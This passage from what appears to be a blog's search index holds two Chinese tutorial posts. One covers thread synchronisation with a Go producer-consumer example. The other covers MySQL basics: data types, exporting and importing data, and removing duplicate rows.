<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>对于线程的个人理解</title>
      <link href="/2020/04/03/go-web/thread/"/>
      <url>/2020/04/03/go-web/thread/</url>
      
        <content type="html"><![CDATA[<h1 id="Thread"><a href="#Thread" class="headerlink" title="Thread"></a>Thread</h1><h2 id="0x10-作业要求"><a href="#0x10-作业要求" class="headerlink" title="0x10 作业要求"></a>0x10 作业要求</h2><p>编程实现多执行体的一个同步或者互斥问题的解决方案</p><ol><li>写出问题的描述</li><li>写出程序的设计思想</li><li>写出程序的源代码</li><li>写出程序的运行结果</li></ol><h2 id="0x20-问题描述"><a href="#0x20-问题描述" class="headerlink" title="0x20 问题描述"></a>0x20 问题描述</h2><p>前置知识：多执行体、同步、互斥</p><h3 id="0x10-同步和互斥"><a href="#0x10-同步和互斥" class="headerlink" title="0x10 同步和互斥"></a>0x10 同步和互斥</h3><p>当有多个线程的时候，经常需要去同步这些线程以访问<strong>同一个数据或资源</strong>。例如，假设有一个程序，其中一个线程用于把文件<strong>读</strong>到内存，而另一个线程用于<strong>统计</strong>文件中的字符数。当然，在把整个文件调入内存之前，统计它的计数是没有意义的。但是，由于每个操作都有自己的线程，操作系统会把两个线程当作是<strong>互不相干</strong>的任务分别执行，这样就可能在没有把整个文件装入内存时统计字数。为解决此问题，你必须使两个线程同步工作。</p><p>所谓<strong>同步</strong>，是指在不同进程之间的若干程序片断，它们的运行必须严格按照规定的某种先后次序来运行，这种先后次序<strong>依赖于要完成的特定的任务</strong>。如果用对资源的访问来定义的话，同步是指<strong>在互斥的基础上（大多数情况），通过其它机制实现访问者对资源的有序访问</strong>。在大多数情况下，同步已经实现了互斥，特别是所有写入资源的情况必定是互斥的。少数情况是指可以允许多个访问者同时访问资源。</p><p>所谓<strong>互斥</strong>，是指散布在不同进程之间的若干程序片断，当某个进程运行其中一个程序片段时，其它进程就不能运行它们之中的任一程序片段，只能等到该进程运行完这个程序片段后才可以运行。如果用对资源的访问来定义的话，互斥某一资源同时只允许一个访问者对其进行访问，具有唯一性和排它性。但互斥无法限制访问者对资源的访问顺序，即访问是无序的。</p><h3 id="0x20-多线程同步和互斥有几种实现方法"><a href="#0x20-多线程同步和互斥有几种实现方法" class="headerlink" title="0x20 多线程同步和互斥有几种实现方法"></a>0x20 多线程同步和互斥有几种实现方法</h3><p>线程间的同步方法大体可分为两类：用户模式和内核模式。顾名思义，内核模式就是指利用系统内核对象的单一性来进行同步，使用时需要切换内核态与用户态，而用户模式就是不需要切换到内核态，只在用户态完成操作。</p><p>用户模式下的方法有：原子操作（例如一个单一的全局变量），临界区。</p><p>内核模式下的方法有：事件，信号量，互斥量。</p><p>1、临界区:通过对多线程的串行化来访问公共资源或一段代码，速度快，适合控制数据访问。<br>2、互斥量:为协调共同对一个共享资源的单独访问而设计的。<br>3、信号量:为控制一个具有有限数量用户资源而设计。<br>4、事 件:用来通知线程有一些事件已发生，从而启动后继任务的开始。</p><h3 id="0x30-Example"><a href="#0x30-Example" class="headerlink" title="0x30 Example"></a>0x30 Example</h3><p>这里让我们来假设一个问题，我们对生产、消费实现同步，比如我们要生产苹果并且通过超市将他卖出去，实现多生产者多消费者线程的同步，假如我们有20个生产者，20个消费者，我们要实现的就是当生产者生产出来的时候就由消费者来竞争购买即生产与购买的同步进行</p><p>这里我使用Go语言演示，我们先定义出我们需要的结构体</p><pre class=" language-lang-go"><code class="language-lang-go">//生产者-消费者 channel 实现 一边生产 一边消费type (    Producer interface {        produceApple(s *superMakert) //生产苹果    }    Consumer interface {        buyApple(s *superMakert) //超市买苹果    }    superMakert struct {        //list包 实现了双向链表        //apples *list.List        apples chan Apple    }    ProducerImpl struct {        Producer //实现生产苹果的接口    }    ConsumerImpl struct {        Consumer //实现消费苹果的接口    }    //苹果的属性,    Apple struct {        weight float64 //重量        number int     //编号    })</code></pre><p>实现生产环节</p><pre class=" language-lang-go"><code class="language-lang-go">func (p *ProducerImpl) produceApple(s *superMakert) {    number := 1    for {        apple := Apple{            number: number,            weight: rand.Float64(),        }        number++        fmt.Printf("生产了编号为%d,重量为%0.2f的苹果\r\n", apple.number, apple.weight)        s.apples <- apple    }}</code></pre><p>实现购买环节</p><pre class=" language-lang-go"><code class="language-lang-go">func (c *ConsumerImpl) buyApple(s *superMakert) {    for {        element, ok := <-s.apples        if ok {            fmt.Printf("买了编号为%d,重量为%0.2f的苹果\r\n", element.number, element.weight)        } else {            fmt.Printf("没有买到苹果")        }    }}</code></pre><p>主函数</p><pre class=" language-lang-go"><code class="language-lang-go">func main() {    //WaitGroup 对象内部有一个计数器，最初从0开始，它有三个方法：Add(), Done(), Wait() 用来控制计数器的数量。Add(n) 把计数器设置为n ，Done() 每次把计数器-1 ，wait() 会阻塞代码的运行，直到计数器地值减为0。    //WaitGroup用于等待一组线程的结束。父线程调用Add方法来设定应等待的线程的数量。    //每个被等待的线程在结束时应调用Done方法。同时，主线程里可以调用Wait方法阻塞至所有线程结束    wg := new(sync.WaitGroup)    p := new(ProducerImpl)    c := new(ConsumerImpl)    a := &superMakert{apples: make(chan Apple, 20)}    for i := 0; i < 20; i++ {        wg.Add(1) //每创建一个goroutine，就把任务队列中任务的数量+1        go func() { //goroutine            p.produceApple(a)            wg.Done() //任务完成-1        }()    }    for j := 0; j < 20; j++ {        wg.Add(1) //每创建一个goroutine，就把任务队列中任务的数量+1        go func() {            c.buyApple(a)            wg.Done() //任务完成-1        }()    }    wg.Wait()}</code></pre><h2 id="0x30-程序思想"><a href="#0x30-程序思想" class="headerlink" title="0x30 程序思想"></a>0x30 程序思想</h2><p>程序思想：</p><p>​    1.生产线程进行时，首先将任务队列中的任务加一，当任务完成时在减一</p><p>​    2.消费线程进行时，首先将任务队列中的任务加一，当任务完成时在减一</p><p>​    3.当消费线程跟不上生产进程时或者生产进程跟不上消费进程时，就阻塞代码进行，等到进程一致时在解放，以此来实现线程的同步</p><h2 id="0x40-源代码"><a href="#0x40-源代码" class="headerlink" title="0x40 源代码"></a>0x40 源代码</h2><pre class=" language-lang-go"><code class="language-lang-go">package mainimport (    "fmt"    "math/rand"    "sync")//生产者-消费者 channel 实现 一边生产 一边消费type (    Producer interface {        produceApple(s *superMakert) //生产苹果    }    Consumer interface {        buyApple(s *superMakert) //超市买苹果    }    superMakert struct {        //list包 实现了双向链表        //apples *list.List        apples chan Apple    }    ProducerImpl struct {        Producer //实现生产苹果的接口    }    ConsumerImpl struct {        Consumer //实现消费苹果的接口    }    Apple struct {        weight float64 //重量        number int     //编号    })//实现接口里面的方法func (p *ProducerImpl) produceApple(s *superMakert) {    number := 1    for {        apple := Apple{            number: number,            weight: rand.Float64(),        }        number++        fmt.Printf("生产了编号为%d,重量为%0.2f的苹果\r\n", apple.number, apple.weight)        s.apples <- apple    }}//实现接口里面的方法func (c *ConsumerImpl) buyApple(s *superMakert) {    for {        element, ok := <-s.apples        if ok {            fmt.Printf("买了编号为%d,重量为%0.2f的苹果\r\n", element.number, element.weight)        } else {            fmt.Printf("没有买到苹果")        }    }}func main() {    //WaitGroup用于等待一组线程的结束。父线程调用Add方法来设定应等待的线程的数量。    //每个被等待的线程在结束时应调用Done方法。同时，主线程里可以调用Wait方法阻塞至所有线程结束    wg := new(sync.WaitGroup)    p := new(ProducerImpl)    c := new(ConsumerImpl)    a := &superMakert{apples: make(chan Apple, 20)}    for i := 0; i < 20; i++ {        wg.Add(1)        go func() { //goroutine            p.produceApple(a)            wg.Done()        }()    }    for j := 0; j < 20; j++ {        wg.Add(1)        go func() {            c.buyApple(a)            wg.Done()        }()    }    wg.Wait()}</code></pre><h2 id="0x50-运行结果"><a href="#0x50-运行结果" class="headerlink" title="0x50 运行结果"></a>0x50 运行结果</h2><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200401204018.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> operating-system </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Thread </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql入门术语及知识点</title>
      <link href="/2020/04/03/go-web/mysql/"/>
      <url>/2020/04/03/go-web/mysql/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL基础术语扫盲"><a href="#MySQL基础术语扫盲" class="headerlink" title="MySQL基础术语扫盲"></a>MySQL基础术语扫盲</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>摘抄与菜鸟教程中，还有一些自己觉得入门有必要知道的一些知识</p><p>数据库共有3种类型，为关系数据库、非关系型数据库和键值数据库。</p><p>1、关系数据库</p><p>MySQL、MariaDB（MySQL的代替品，英文维基百科从MySQL转向MariaDB）、Percona Server（MySQL的代替品·）、PostgreSQL、Microsoft Access、Microsoft SQL Server、Google Fusion Tables、FileMaker、Oracle数据库、Sybase、dBASE、Clipper、FoxPro、foshub。</p><p>几乎所有的数据库管理系统都配备了一个开放式数据库连接（ODBC）驱动程序，令各个数据库之间得以互相集成。</p><p>2、非关系型数据库（NoSQL）</p><p>BigTable（Google）、Cassandra、MongoDB、CouchDB。</p><p>3、键值（key-value）数据库</p><p>Apache Cassandra（为Facebook所使用）：高度可扩展、Dynamo、LevelDB（Google）</p><p><strong>Operational-Relational Database：</strong>关系数据库</p><ul><li>典型应用场景: ERP, CRM, 信用卡交易处理, 小型电子商务</li><li>数据存储方式: 表格</li><li>主流厂商: Oracle Database, Microsoft SQL Server, IBM DB2, SAP Hana, Amazon Aurora, Azure SQL Database, Enterprise DB (PostgreSQL), MySQL, MemSQL</li><li>优势：成熟的生态环境，事务保证/数据一致性</li><li>劣势：严格的数据模型定义，数据库扩展限制，与非结构化的融合使用较难。</li></ul><p><strong>Analytical-Relational Database：</strong></p><ul><li>典型应用场景: 数据仓库，商务智能，数据科学</li><li>数据存储方式: 表格</li><li>主流厂商: Oracle Exadata, Oracle Hyperion, Teradata, IBM Netezza, IBM dashDB, Amazon Redshift, Microsoft SQL Data Warehouse, Google BigQuery</li><li>优势: 信息和计算的一致性</li><li>劣势: 需要针对数据库专业的IT人员维护，数据响应数据通常在分钟级</li></ul><p><strong>Operational-Nonrelational Database:</strong>非关系型数据库</p><ul><li>典型应用场景: Web, mobile, and IoT applications, social networking, user recommendations, shopping carts</li><li>数据存储方式: 有很多存储结构 (document, graph, column, key-value, time series)</li><li>主流厂商: MongoDB, Amazon DynamoDB, Amazon，DocumentDB, Azure CosmosDB, DataStax, Neo4j, Couchbase, MarkLogic, Redis</li><li>优势: 易用性，灵活性(不需要预定义的模式)，水平伸缩(以适应大量数据量)，一般低成本(开源)</li><li>劣势: 缺乏事务保证</li></ul><p><strong>Analytical -Nonrelational Database:</strong></p><ul><li>典型应用场景: 索引数以百万计的数据点，预测性分析,欺诈检测</li><li>数据存储方式: Hadoop不需要固有的数据结构; 数据可以跨多个服务器存储</li><li>主流厂商: Cloudera, Hortonworks, MapR, MarkLogic, Snowflake, DataBricks, ElasticSearch</li><li>优势: 适合批量处理, 并行处理文件; 主要是开源的，投入较低</li><li>劣势: 缓慢的响应时间; 不适合快速查找或快速更新</li></ul><h2 id="0x10-数据类型"><a href="#0x10-数据类型" class="headerlink" title="0x10 数据类型"></a>0x10 数据类型</h2><h3 id="0x10-数值类型"><a href="#0x10-数值类型" class="headerlink" title="0x10 数值类型"></a>0x10 数值类型</h3><p>MySQL支持所有标准SQL数值数据类型。</p><p>这些类型包括严格数值数据类型(INTEGER、SMALLINT、DECIMAL和NUMERIC)，以及近似数值数据类型(FLOAT、REAL和DOUBLE PRECISION)。</p><p>关键字INT是INTEGER的同义词，关键字DEC是DECIMAL的同义词。</p><p>BIT数据类型保存位字段值，并且支持MyISAM、MEMORY、InnoDB和BDB表。</p><p>作为SQL标准的扩展，MySQL也支持整数类型TINYINT、MEDIUMINT和BIGINT。下面的表显示了需要的每个整数类型的存储和范围。</p><div class="table-container"><table><thead><tr><th style="text-align:left">类型</th><th style="text-align:left">大小</th><th style="text-align:left">范围（有符号）</th><th style="text-align:left">范围（无符号）</th><th style="text-align:left">用途</th></tr></thead><tbody><tr><td style="text-align:left">TINYINT</td><td style="text-align:left">1 字节</td><td style="text-align:left">(-128，127)</td><td style="text-align:left">(0，255)</td><td style="text-align:left">小整数值</td></tr><tr><td style="text-align:left">SMALLINT</td><td style="text-align:left">2 字节</td><td style="text-align:left">(-32 768，32 767)</td><td style="text-align:left">(0，65 535)</td><td style="text-align:left">大整数值</td></tr><tr><td style="text-align:left">MEDIUMINT</td><td style="text-align:left">3 字节</td><td style="text-align:left">(-8 388 608，8 388 607)</td><td style="text-align:left">(0，16 777 215)</td><td style="text-align:left">大整数值</td></tr><tr><td style="text-align:left">INT或INTEGER</td><td style="text-align:left">4 字节</td><td style="text-align:left">(-2 147 483 648，2 147 483 647)</td><td style="text-align:left">(0，4 294 967 295)</td><td style="text-align:left">大整数值</td></tr><tr><td style="text-align:left">BIGINT</td><td style="text-align:left">8 字节</td><td style="text-align:left">(-9,223,372,036,854,775,808，9 223 372 036 854 775 807)</td><td style="text-align:left">(0，18 446 744 073 709 551 615)</td><td style="text-align:left">极大整数值</td></tr><tr><td style="text-align:left">FLOAT</td><td style="text-align:left">4 字节</td><td style="text-align:left">(-3.402 823 466 E+38，-1.175 494 351 E-38)，0，(1.175 494 351 E-38，3.402 823 466 351 E+38)</td><td style="text-align:left">0，(1.175 494 351 E-38，3.402 823 466 E+38)</td><td style="text-align:left">单精度 浮点数值</td></tr><tr><td style="text-align:left">DOUBLE</td><td style="text-align:left">8 字节</td><td style="text-align:left">(-1.797 693 134 862 315 7 E+308，-2.225 073 858 507 201 4 E-308)，0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td><td style="text-align:left">0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td><td style="text-align:left">双精度 浮点数值</td></tr><tr><td style="text-align:left">DECIMAL</td><td style="text-align:left">对DECIMAL(M,D) ，如果M&gt;D，为M+2否则为D+2</td><td style="text-align:left">依赖于M和D的值</td><td style="text-align:left">依赖于M和D的值</td><td style="text-align:left">小数值</td></tr></tbody></table></div><h3 id="0x20-日期和时间类型"><a href="#0x20-日期和时间类型" class="headerlink" title="0x20 日期和时间类型"></a>0x20 日期和时间类型</h3><p>表示时间值的日期和时间类型为DATETIME、DATE、TIMESTAMP、TIME和YEAR。</p><p>每个时间类型有一个有效值范围和一个”零”值，当指定不合法的MySQL不能表示的值时使用”零”值。</p><p>TIMESTAMP类型有专有的自动更新特性，将在后面描述。</p><div class="table-container"><table><thead><tr><th style="text-align:left">类型</th><th style="text-align:left">大小 (字节)</th><th style="text-align:left">范围</th><th style="text-align:left">格式</th><th style="text-align:left">用途</th></tr></thead><tbody><tr><td style="text-align:left">DATE</td><td style="text-align:left">3</td><td style="text-align:left">1000-01-01/9999-12-31</td><td style="text-align:left">YYYY-MM-DD</td><td style="text-align:left">日期值</td></tr><tr><td style="text-align:left">TIME</td><td style="text-align:left">3</td><td style="text-align:left">‘-838:59:59’/‘838:59:59’</td><td style="text-align:left">HH:MM:SS</td><td style="text-align:left">时间值或持续时间</td></tr><tr><td style="text-align:left">YEAR</td><td style="text-align:left">1</td><td style="text-align:left">1901/2155</td><td style="text-align:left">YYYY</td><td style="text-align:left">年份值</td></tr><tr><td style="text-align:left">DATETIME</td><td style="text-align:left">8</td><td style="text-align:left">1000-01-01 00:00:00/9999-12-31 23:59:59</td><td style="text-align:left">YYYY-MM-DD HH:MM:SS</td><td style="text-align:left">混合日期和时间值</td></tr><tr><td style="text-align:left">TIMESTAMP</td><td style="text-align:left">4</td><td style="text-align:left">1970-01-01 00:00:00/2038结束时间是第 <strong>2147483647</strong> 秒，北京时间 <strong>2038-1-19 11:14:07</strong>，格林尼治时间 2038年1月19日 凌晨 03:14:07</td><td style="text-align:left">YYYYMMDD HHMMSS</td><td style="text-align:left">混合日期和时间值，时间戳</td></tr></tbody></table></div><h3 id="0x30-字符串类型"><a href="#0x30-字符串类型" class="headerlink" title="0x30 字符串类型"></a>0x30 字符串类型</h3><p>字符串类型指CHAR、VARCHAR、BINARY、VARBINARY、BLOB、TEXT、ENUM和SET。该节描述了这些类型如何工作以及如何在查询中使用这些类型。</p><div class="table-container"><table><thead><tr><th style="text-align:left">类型</th><th style="text-align:left">大小</th><th style="text-align:left">用途</th></tr></thead><tbody><tr><td style="text-align:left">CHAR</td><td style="text-align:left">0-255字节</td><td style="text-align:left">定长字符串</td></tr><tr><td style="text-align:left">VARCHAR</td><td style="text-align:left">0-65535 字节</td><td style="text-align:left">变长字符串</td></tr><tr><td style="text-align:left">TINYBLOB</td><td style="text-align:left">0-255字节</td><td style="text-align:left">不超过 255 个字符的二进制字符串</td></tr><tr><td style="text-align:left">TINYTEXT</td><td style="text-align:left">0-255字节</td><td style="text-align:left">短文本字符串</td></tr><tr><td style="text-align:left">BLOB</td><td style="text-align:left">0-65 535字节</td><td style="text-align:left">二进制形式的长文本数据</td></tr><tr><td style="text-align:left">TEXT</td><td style="text-align:left">0-65 535字节</td><td style="text-align:left">长文本数据</td></tr><tr><td style="text-align:left">MEDIUMBLOB</td><td style="text-align:left">0-16 777 215字节</td><td style="text-align:left">二进制形式的中等长度文本数据</td></tr><tr><td style="text-align:left">MEDIUMTEXT</td><td style="text-align:left">0-16 777 215字节</td><td style="text-align:left">中等长度文本数据</td></tr><tr><td style="text-align:left">LONGBLOB</td><td style="text-align:left">0-4 294 967 295字节</td><td style="text-align:left">二进制形式的极大文本数据</td></tr><tr><td style="text-align:left">LONGTEXT</td><td style="text-align:left">0-4 294 967 295字节</td><td style="text-align:left">极大文本数据</td></tr></tbody></table></div><p>CHAR 和 VARCHAR 类型类似，但它们保存和检索的方式不同。它们的最大长度和是否尾部空格被保留等方面也不同。在存储或检索过程中不进行大小写转换。</p><p>BINARY 和 VARBINARY 类似于 CHAR 和 VARCHAR，不同的是它们包含二进制字符串而不要非二进制字符串。也就是说，它们包含字节字符串而不是字符字符串。这说明它们没有字符集，并且排序和比较基于列值字节的数值值。</p><p>BLOB 是一个二进制大对象，可以容纳可变数量的数据。有 4 种 BLOB 类型：TINYBLOB、BLOB、MEDIUMBLOB 和 LONGBLOB。它们区别在于可容纳存储范围不同。</p><p>有 4 种 TEXT 类型：TINYTEXT、TEXT、MEDIUMTEXT 和 LONGTEXT。对应的这 4 种 BLOB 类型，可存储的最大长度不同，可根据实际情况选择。</p><h2 id="0x20-导出数据"><a href="#0x20-导出数据" class="headerlink" title="0x20 导出数据"></a>0x20 导出数据</h2><h3 id="0x10-MySQL-导出数据"><a href="#0x10-MySQL-导出数据" class="headerlink" title="0x10 MySQL 导出数据"></a>0x10 MySQL 导出数据</h3><p>MySQL中你可以使用<strong>SELECT…INTO OUTFILE</strong>语句来简单的导出数据到文本文件上。</p><h4 id="0x11-使用-SELECT-…-INTO-OUTFILE-语句导出数据"><a href="#0x11-使用-SELECT-…-INTO-OUTFILE-语句导出数据" class="headerlink" title="0x11 使用 SELECT … INTO OUTFILE 语句导出数据"></a>0x11 使用 SELECT … INTO OUTFILE 语句导出数据</h4><p>以下实例中我们将数据表 runoob_tbl 数据导出到 /tmp/runoob.txt 文件中:</p><pre class=" language-lang-txt"><code class="language-lang-txt">mysql> SELECT * FROM runoob_tbl     -> INTO OUTFILE '/tmp/runoob.txt';</code></pre><p>你可以通过命令选项来设置数据输出的指定格式，以下实例为导出 CSV 格式：</p><pre class=" language-lang-txt"><code class="language-lang-txt">mysql> SELECT * FROM passwd INTO OUTFILE '/tmp/runoob.txt'    -> FIELDS TERMINATED BY ',' ENCLOSED BY '"'    -> LINES TERMINATED BY '\r\n';</code></pre><p>在下面的例子中，生成一个文件，各值用逗号隔开。这种格式可以被许多程序使用。</p><pre class=" language-lang-txt"><code class="language-lang-txt">SELECT a,b,a+b INTO OUTFILE '/tmp/result.text'FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"'LINES TERMINATED BY '\n'FROM test_table;</code></pre><h4 id="0x12-SELECT-…-INTO-OUTFILE-语句有以下属性"><a href="#0x12-SELECT-…-INTO-OUTFILE-语句有以下属性" class="headerlink" title="0x12 SELECT … INTO OUTFILE 语句有以下属性:"></a>0x12 SELECT … INTO OUTFILE 语句有以下属性:</h4><ul><li>LOAD DATA INFILE是SELECT … INTO OUTFILE的逆操作，SELECT句法。为了将一个数据库的数据写入一个文件，使用SELECT … INTO OUTFILE，为了将文件读回数据库，使用LOAD DATA INFILE。</li><li>SELECT…INTO OUTFILE ‘file_name’形式的SELECT可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有FILE权限，才能使用此语法。</li><li>输出不能是一个已存在的文件。防止文件数据被篡改。</li><li>你需要有一个登陆服务器的账号来检索文件。否则 SELECT … INTO OUTFILE 不会起任何作用。</li><li>在UNIX中，该文件被创建后是可读的，权限由MySQL服务器所拥有。这意味着，虽然你就可以读取该文件，但可能无法将其删除。</li></ul><h3 id="0x20-导出表作为原始数据"><a href="#0x20-导出表作为原始数据" class="headerlink" title="0x20 导出表作为原始数据"></a>0x20 导出表作为原始数据</h3><p><strong>mysqldump</strong> 是 mysql 用于转存储数据库的实用程序。它主要产生一个 SQL 脚本，其中包含从头重新创建数据库所必需的命令 CREATE TABLE INSERT 等。</p><p>使用 <strong>mysqldump</strong> 导出数据需要使用 <strong>—tab</strong> 选项来指定导出文件指定的目录，该目标必须是可写的。</p><p>以下实例将数据表 runoob_tbl 导出到 /tmp 目录中：</p><pre class=" language-lang-txt"><code class="language-lang-txt">$ mysqldump -u root -p --no-create-info \            --tab=/tmp RUNOOB runoob_tblpassword ******</code></pre><h3 id="0x30-导出-SQL-格式的数据"><a href="#0x30-导出-SQL-格式的数据" class="headerlink" title="0x30 导出 SQL 格式的数据"></a>0x30 导出 SQL 格式的数据</h3><p>导出 SQL 格式的数据到指定文件，如下所示：</p><pre class=" language-lang-txt"><code class="language-lang-txt">$ mysqldump -u root -p RUNOOB runoob_tbl > dump.txtpassword ******</code></pre><p>以上命令创建的文件内容如下：</p><pre class=" language-lang-txt"><code class="language-lang-txt">-- MySQL dump 8.23---- Host: localhost    Database: RUNOOB----------------------------------------------------------- Server version       3.23.58---- Table structure for table `runoob_tbl`--CREATE TABLE runoob_tbl (  runoob_id int(11) NOT NULL auto_increment,  runoob_title varchar(100) NOT NULL default '',  runoob_author varchar(40) NOT NULL default '',  submission_date date default NULL,  PRIMARY KEY  (runoob_id),  UNIQUE KEY AUTHOR_INDEX (runoob_author)) TYPE=MyISAM;---- Dumping data for table `runoob_tbl`--INSERT INTO runoob_tbl        VALUES (1,'Learn PHP','John Poul','2007-05-24');INSERT INTO runoob_tbl        VALUES (2,'Learn MySQL','Abdul S','2007-05-24');INSERT INTO runoob_tbl        VALUES (3,'JAVA Tutorial','Sanjay','2007-05-06');</code></pre><p>如果你需要导出整个数据库的数据，可以使用以下命令：</p><pre class=" language-lang-txt"><code class="language-lang-txt">$ mysqldump -u root -p RUNOOB > database_dump.txtpassword ******</code></pre><p>如果需要备份所有数据库，可以使用以下命令：</p><pre class=" language-lang-txt"><code class="language-lang-txt">$ mysqldump -u root -p --all-databases > database_dump.txtpassword ******</code></pre><p>—all-databases 选项在 MySQL 3.23.12 及以后版本加入。</p><p>该方法可用于实现数据库的备份策略。</p><h3 id="0x40-将数据表及数据库拷贝至其他主机"><a href="#0x40-将数据表及数据库拷贝至其他主机" class="headerlink" title="0x40 将数据表及数据库拷贝至其他主机"></a>0x40 将数据表及数据库拷贝至其他主机</h3><p>如果你需要将数据拷贝至其他的 MySQL 服务器上, 你可以在 mysqldump 命令中指定数据库名及数据表。</p><p>在源主机上执行以下命令，将数据备份至 dump.txt 文件中:</p><pre class=" language-lang-txt"><code class="language-lang-txt">$ mysqldump -u root -p database_name table_name > dump.txtpassword *****</code></pre><p>如果完整备份数据库，则无需使用特定的表名称。</p><p>如果你需要将备份的数据库导入到MySQL服务器中，可以使用以下命令，使用以下命令你需要确认数据库已经创建：</p><pre class=" language-lang-txt"><code class="language-lang-txt">$ mysql -u root -p database_name < dump.txtpassword *****</code></pre><p>你也可以使用以下命令将导出的数据直接导入到远程的服务器上，但请确保两台服务器是相通的，是可以相互访问的：</p><pre class=" language-lang-txt"><code class="language-lang-txt">$ mysqldump -u root -p database_name \       | mysql -h other-host.com database_name</code></pre><h2 id="0x30-处理重复数据"><a href="#0x30-处理重复数据" class="headerlink" title="0x30 处理重复数据"></a>0x30 处理重复数据</h2><h3 id="0x10-防止表中出现重复数据-主键、唯一"><a href="#0x10-防止表中出现重复数据-主键、唯一" class="headerlink" title="0x10 防止表中出现重复数据(主键、唯一)"></a>0x10 防止表中出现重复数据(主键、唯一)</h3><p>你可以在 MySQL 数据表中设置指定的字段为 <strong>PRIMARY KEY（主键）</strong> 或者 <strong>UNIQUE（唯一）</strong> 索引来保证数据的唯一性。</p><p>让我们尝试一个实例：下表中无索引及主键，所以该表允许出现多条重复记录。</p><pre class=" language-lang-txt"><code class="language-lang-txt">CREATE TABLE person_tbl(    first_name CHAR(20),    last_name CHAR(20),    sex CHAR(10));</code></pre><p>如果你想设置表中字段 first_name，last_name 数据不能重复，你可以设置双主键模式来设置数据的唯一性， 如果你设置了双主键，那么那个键的默认值不能为 NULL，可设置为 NOT NULL。如下所示：</p><pre class=" language-lang-txt"><code class="language-lang-txt">CREATE TABLE person_tbl(   first_name CHAR(20) NOT NULL,   last_name CHAR(20) NOT NULL,   sex CHAR(10),   PRIMARY KEY (last_name, first_name));</code></pre><p>如果我们设置了唯一索引，那么在插入重复数据时，SQL 语句将无法执行成功,并抛出错。</p><p>INSERT IGNORE INTO 与 INSERT INTO 的区别就是 INSERT IGNORE 会忽略数据库中已经存在的数据，如果数据库没有数据，就插入新的数据，如果有数据的话就跳过这条数据。这样就可以保留数据库中已经存在数据，达到在间隙中插入数据的目的。</p><p>以下实例使用了 INSERT IGNORE INTO，执行后不会出错，也不会向数据表中插入重复数据：</p><pre class=" language-lang-txt"><code class="language-lang-txt">mysql> INSERT IGNORE INTO person_tbl (last_name, first_name)    -> VALUES( 'Jay', 'Thomas');Query OK, 1 row affected (0.00 sec)mysql> INSERT IGNORE INTO person_tbl (last_name, first_name)    -> VALUES( 'Jay', 'Thomas');Query OK, 0 rows affected (0.00 sec)</code></pre><p>INSERT IGNORE INTO 当插入数据时，在设置了记录的唯一性后，如果插入重复数据，将不返回错误，只以警告形式返回。 而 REPLACE INTO 如果存在 primary 或 unique 相同的记录，则先删除掉。再插入新记录。</p><p>另一种设置数据的唯一性方法是添加一个 UNIQUE 索引，如下所示：</p><pre class=" language-lang-txt"><code class="language-lang-txt">CREATE TABLE person_tbl(   first_name CHAR(20) NOT NULL,   last_name CHAR(20) NOT NULL,   sex CHAR(10),   UNIQUE (last_name, first_name));</code></pre><h3 id="0x20-统计重复数据"><a href="#0x20-统计重复数据" class="headerlink" title="0x20 统计重复数据"></a>0x20 统计重复数据</h3><p>以下我们将统计表中 first_name 和 last_name的重复记录数：</p><pre class=" language-lang-txt"><code class="language-lang-txt">mysql> SELECT COUNT(*) as repetitions, last_name, first_name    -> FROM person_tbl    -> GROUP BY last_name, first_name    -> HAVING repetitions > 1;</code></pre><p>以上查询语句将返回 person_tbl 表中重复的记录数。 一般情况下，查询重复的值，请执行以下操作：</p><ul><li>确定哪一列包含的值可能会重复。</li><li>在列选择列表使用COUNT(*)列出的那些列。</li><li>在GROUP BY子句中列出的列。</li><li>HAVING子句设置重复数大于1。</li></ul><h3 id="0x30-过滤重复数据"><a href="#0x30-过滤重复数据" class="headerlink" title="0x30 过滤重复数据"></a>0x30 过滤重复数据</h3><p>如果你需要读取不重复的数据可以在 SELECT 语句中使用 DISTINCT 关键字来过滤重复数据。</p><pre class=" language-lang-txt"><code class="language-lang-txt">mysql> SELECT DISTINCT last_name, first_name    -> FROM person_tbl;</code></pre><p>你也可以使用 GROUP BY 来读取数据表中不重复的数据：</p><pre class=" language-lang-txt"><code class="language-lang-txt">mysql> SELECT last_name, first_name    -> FROM person_tbl    -> GROUP BY (last_name, first_name);</code></pre><h3 id="0x40删除重复数据"><a href="#0x40删除重复数据" class="headerlink" title="0x40删除重复数据"></a>0x40删除重复数据</h3><p>如果你想删除数据表中的重复数据，你可以使用以下的SQL语句：</p><pre class=" language-lang-txt"><code class="language-lang-txt">mysql> CREATE TABLE tmp SELECT last_name, first_name, sex FROM person_tbl  GROUP BY (last_name, first_name, sex);mysql> DROP TABLE person_tbl;mysql> ALTER TABLE tmp RENAME TO person_tbl;</code></pre><p>当然你也可以在数据表中添加 INDEX（索引） 和 PRIMAY KEY（主键）这种简单的方法来删除表中的重复记录。方法如下：</p><pre class=" language-lang-txt"><code class="language-lang-txt">mysql> ALTER IGNORE TABLE person_tbl    -> ADD PRIMARY KEY (last_name, first_name);</code></pre><h2 id="0x40-导入数据"><a href="#0x40-导入数据" class="headerlink" title="0x40 导入数据"></a>0x40 导入数据</h2><h3 id="0x10-mysql-命令导入"><a href="#0x10-mysql-命令导入" class="headerlink" title="0x10 mysql 命令导入"></a>0x10 mysql 命令导入</h3><p>使用 mysql 命令导入语法格式为：</p><pre class=" language-lang-txt"><code class="language-lang-txt">mysql -u用户名    -p密码    <  要导入的数据库数据(runoob.sql)</code></pre><p><strong>实例：</strong></p><pre class=" language-lang-txt"><code 